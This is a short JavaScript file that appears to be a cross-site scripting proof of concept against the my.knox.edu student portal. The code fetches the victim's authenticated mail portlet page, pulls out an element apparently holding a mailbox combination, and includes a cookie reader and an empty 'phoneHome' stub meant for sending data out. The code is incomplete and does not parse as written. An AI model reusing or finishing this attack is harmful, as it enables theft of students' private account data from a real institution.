//<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"> </script> 


var doc = ""

    function phoneHome(payload){
        xhr = new XMLHttpRequest();
        

        xhr.responseType = 'text/html';
        xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {



    }       

    function httpReq(url) {
        
            xhr = new XMLHttpRequest();
            

            xhr.responseType = 'text/html';
            xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                //return(xhr.response);
                
                htmlString = xhr.response
                var parser = new DOMParser();
                doc = parser.parseFromString(htmlString, "text/html")
                
                unlock = doc.getElementById("comboDiv").innerHTML
                document.getElementById("unl").innerHTML = unlock
                
                
            }
        };

        xhr.open('GET', url);
        xhr.send();
    
    
    }
    
    
    function getCookie(cname) { //taken from https://www.w3schools.com/js/js_cookies.asp
      let name = cname + "=";
      let decodedCookie = decodeURIComponent(document.cookie);
      let ca = decodedCookie.split(';');
      for(let i = 0; i <ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
          c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
          return c.substring(name.length, c.length);
        }
      }
      return "";
    }
    
    
    
    
    
    
    httpReq("https://my.knox.edu/ICS/Student_Services/Mail_Portlet.jnz")
    
    //setTimeout(function(){ window.alert("Cross Site Scripting on Knox.edu  "); }, 1.0*1000);
    




